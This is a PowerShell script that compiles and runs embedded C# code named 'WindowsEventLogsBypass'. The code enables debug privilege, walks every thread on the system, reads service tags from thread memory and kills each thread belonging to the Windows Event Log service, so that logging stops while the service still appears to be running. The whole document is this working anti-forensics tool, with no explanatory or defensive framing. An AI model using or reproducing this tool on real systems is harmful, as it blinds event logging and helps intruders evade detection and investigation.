$csharpCode = @'
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace WindowsEventLogsBypass
{
    public class Program
    {
        private const Int32 ANYSIZE_ARRAY = 1;
        private const UInt32 TOKEN_QUERY = 0x0008;
        private const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        private const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
        public static IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
    
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AdjustTokenPrivileges(
            IntPtr TokenHandle,
            [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            UInt32 BufferLengthInBytes,
            IntPtr PreviousState,
            out UInt32 ReturnLengthInBytes
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(
            IntPtr ProcessHandle, 
            UInt32 DesiredAccess, 
            out IntPtr TokenHandle
        );

        [DllImport("advapi32.dll")]
        static extern bool LookupPrivilegeValue(
            string lpSystemName, 
            string lpName,
            ref long lpLuid
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern ulong I_QueryTagInformation(
            IntPtr MachineName,
            SC_SERVICE_TAG_QUERY_TYPE InfoLevel,
            ref _SC_SERVICE_TAG_QUERY TagInfo
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        static extern IntPtr CreateToolhelp32Snapshot([In] UInt32 dwFlags, [In] UInt32 th32ProcessID);

        [DllImport("kernel32.dll")]
        static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll")]
        public static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            IntPtr processId
        );

        [DllImport("kernel32.dll")]
        public static extern void RtlZeroMemory(
            IntPtr pBuffer,
            int length
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int SuspendThread(IntPtr hThread);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtQueryInformationThread(
            IntPtr handle, 
            uint infclass, 
            ref THREAD_BASIC_INFORMATION info, 
            uint length,
            UInt32 bytesread
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern Boolean NtReadVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            UInt64 NumberOfBytesToRead,
            ref UInt64 liRet
        );

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct LUID_AND_ATTRIBUTES
        {
            public long Luid;
            public UInt32 Attributes;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct THREADENTRY32
        {
            internal UInt32 dwSize;
            internal UInt32 cntUsage;
            internal UInt32 th32ThreadID;
            internal UInt32 th32OwnerProcessID;
            internal UInt32 tpBasePri;
            internal UInt32 tpDeltaPri;
            internal UInt32 dwFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct THREAD_BASIC_INFORMATION
        {
            public int ExitStatus;
            public IntPtr TebBaseAdress;
            public CLIENT_ID ClientId;
            public IntPtr AffinityMask;
            public int Priority;
            public int BasePriority;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct _SC_SERVICE_TAG_QUERY
        {
            public UInt32 processId;
            public UInt32 serviceTag;
            public UInt32 reserved;
            public IntPtr pBuffer;
        }
        
        [Flags]
        public enum ThreadAccess : int
        {
            THREAD_ALL_ACCESS = 0x001F03FF,
            TERMINATE = 0x0001,
            SUSPEND_RESUME = 0x0002,
            GET_CONTEXT = 0x0008,
            SET_CONTEXT = 0x0010,
            SET_INFORMATION = 0x0020,
            QUERY_INFORMATION = 0x0040,
            SET_THREAD_TOKEN = 0x0080,
            IMPERSONATE = 0x0100,
            DIRECT_IMPERSONATION = 0x0200
        }

        public enum NTSTATUS : uint
        {
            Success = 0,
            Informational = 0x40000000,
            Error = 0xc0000000
        }

        public enum SC_SERVICE_TAG_QUERY_TYPE : ushort
        {
            ServiceNameFromTagInformation = 1,
            ServiceNamesReferencingModuleInformation = 2,
            ServiceNameTagMappingInformation = 3
        }

        [Flags]
        public enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F,
            NoHeaps = 0x40000000
        }

        public enum PrivilegeNames
        {
            SeCreateTokenPrivilege,
            SeAssignPrimaryTokenPrivilege,
            SeLockMemoryPrivilege,
            SeIncreaseQuotaPrivilege,
            SeUnsolicitedInputPrivilege,
            SeMachineAccountPrivilege,
            SeTcbPrivilege,
            SeSecurityPrivilege,
            SeTakeOwnershipPrivilege,
            SeLoadDriverPrivilege,
            SeSystemProfilePrivilege,
            SeSystemtimePrivilege,
            SeProfileSingleProcessPrivilege,
            SeIncreaseBasePriorityPrivilege,
            SeCreatePagefilePrivilege,
            SeCreatePermanentPrivilege,
            SeBackupPrivilege,
            SeRestorePrivilege,
            SeShutdownPrivilege,
            SeDebugPrivilege,
            SeAuditPrivilege,
            SeSystemEnvironmentPrivilege,
            SeChangeNotifyPrivilege,
            SeRemoteShutdownPrivilege,
            SeUndockPrivilege,
            SeSyncAgentPrivilege,
            SeEnableDelegationPrivilege,
            SeManageVolumePrivilege,
            SeImpersonatePrivilege,
            SeCreateGlobalPrivilege,
            SeTrustedCredManAccessPrivilege,
            SeRelabelPrivilege,
            SeIncreaseWorkingSetPrivilege,
            SeTimeZonePrivilege,
            SeCreateSymbolicLinkPrivilege
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        public static void TerminateEventlogThread(UInt32 tid)
        {
            IntPtr hThread = OpenThread(ThreadAccess.TERMINATE, false, tid);
            if (TerminateThread(hThread, 0)) { }
            CloseHandle(hThread);
        }

        public static bool GetServiceTagString(IntPtr processId, ulong tag, ref IntPtr pBuffer)
        {
            _SC_SERVICE_TAG_QUERY tagQuery = new _SC_SERVICE_TAG_QUERY();
            tagQuery.processId = (UInt32)processId;
            tagQuery.serviceTag = (UInt32)tag;
            tagQuery.reserved = 0;
            tagQuery.pBuffer = IntPtr.Zero;
            ulong QueryReturn = I_QueryTagInformation(IntPtr.Zero, SC_SERVICE_TAG_QUERY_TYPE.ServiceNameFromTagInformation, ref tagQuery);
            if (QueryReturn == 0 && tagQuery.pBuffer != IntPtr.Zero)
            {
                pBuffer = tagQuery.pBuffer;
                return true;
            }
            return false;
        }

        public static bool GetServiceTag(IntPtr processId, IntPtr threadId, ref ulong pServiceTag)
        {
            THREAD_BASIC_INFORMATION tbi = new THREAD_BASIC_INFORMATION();
            IntPtr process = IntPtr.Zero;
            IntPtr thread = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)threadId);
            if ((uint)thread == 0) return false;
            NtQueryInformationThread(thread, 0, ref tbi, (uint)Marshal.SizeOf(tbi), 0);
            process = OpenProcess((uint)ProcessAccessFlags.VirtualMemoryRead, false, processId);
            if ((uint)process == 0) return false;
            UInt64 subProcessTag_Offset = 0x1720;
            UInt64 byteRead = 0;
            IntPtr pMemLoc = Marshal.AllocHGlobal(8);
            RtlZeroMemory(pMemLoc, 8);
            NtReadVirtualMemory(process, (IntPtr)((UInt64)tbi.TebBaseAdress + subProcessTag_Offset), pMemLoc, 8, ref byteRead);
            UInt64 subProcessTag = (uint)Marshal.ReadInt64(pMemLoc, 0);
            if (subProcessTag != 0) pServiceTag = (ulong)subProcessTag;
            CloseHandle(process);
            CloseHandle(thread);
            return subProcessTag != 0;
        }

        public static bool GetServiceTagName(UInt32 tid)
        {
            const int MAX_PATH = 260;
            IntPtr hThread = OpenThread(ThreadAccess.QUERY_INFORMATION, false, tid);
            if ((int)hThread == 0) return false;
            THREAD_BASIC_INFORMATION tbi = new THREAD_BASIC_INFORMATION();
            NtQueryInformationThread(hThread, 0, ref tbi, (uint)Marshal.SizeOf(tbi), 0);
            IntPtr processid = tbi.ClientId.UniqueProcess;
            ulong serviceTag = 0;
            if (!GetServiceTag(processid, (IntPtr)tid, ref serviceTag)) return false;
            IntPtr pData = Marshal.AllocHGlobal(MAX_PATH);
            RtlZeroMemory(pData, MAX_PATH);
            if (!GetServiceTagString(processid, serviceTag, ref pData)) return false;
            string tagString = Marshal.PtrToStringUni(pData);
            if (string.Equals(tagString, "eventlog", StringComparison.OrdinalIgnoreCase))
            {
                TerminateEventlogThread(tid);
                return true;
            }
            return false;
        }

        public static void ListProcessThreads(out int total, out int killed)
        {
            total = 0;
            killed = 0;
            IntPtr hThreadSnap = CreateToolhelp32Snapshot((uint)SnapshotFlags.Thread, 0);
            if (hThreadSnap == INVALID_HANDLE_VALUE) return;
            THREADENTRY32 te32 = new THREADENTRY32();
            te32.dwSize = (uint)Marshal.SizeOf(te32);
            if (!Thread32First(hThreadSnap, ref te32))
            {
                CloseHandle(hThreadSnap);
                return;
            }
            do
            {
                if (te32.th32OwnerProcessID != 0)
                {
                    total++;
                    if (GetServiceTagName(te32.th32ThreadID))
                        killed++;
                }
            } while (Thread32Next(hThreadSnap, ref te32));
            CloseHandle(hThreadSnap);
        }

        public static bool SetPrivilege()
        {
            IntPtr hToken;
            TOKEN_PRIVILEGES NewState = new TOKEN_PRIVILEGES();
            long luidPrivilegeLUID = 0;
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken) || 
                !LookupPrivilegeValue(null, PrivilegeNames.SeDebugPrivilege.ToString(), ref luidPrivilegeLUID))
                return false;
            NewState.PrivilegeCount = 1;
            NewState.Privileges.Luid = luidPrivilegeLUID;
            NewState.Privileges.Attributes = SE_PRIVILEGE_ENABLED;
            uint temp = 0;
            if (!AdjustTokenPrivileges(hToken, false, ref NewState, 0, IntPtr.Zero, out temp))
                return false;
            return true;
        }

        public static void Main(string[] args)
        {
            if (!SetPrivilege())
            {
                Console.WriteLine("[-] Failed to enable SeDebugPrivilege");
                return;
            }
            
            Stopwatch sw = Stopwatch.StartNew();
            int totalThreads, killedThreads;
            ListProcessThreads(out totalThreads, out killedThreads);
            sw.Stop();
            
            Console.WriteLine("[+] EventLogs");
            Console.WriteLine("[+] Total Threads: " + totalThreads);
            Console.WriteLine("[+] Threads Killed: " + killedThreads);
            Console.WriteLine("[+] Elapsed time: " + sw.ElapsedMilliseconds + "ms");
        }
    }
}
'@

Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies "System.Runtime.InteropServices"
[WindowsEventLogsBypass.Program]::Main($null)
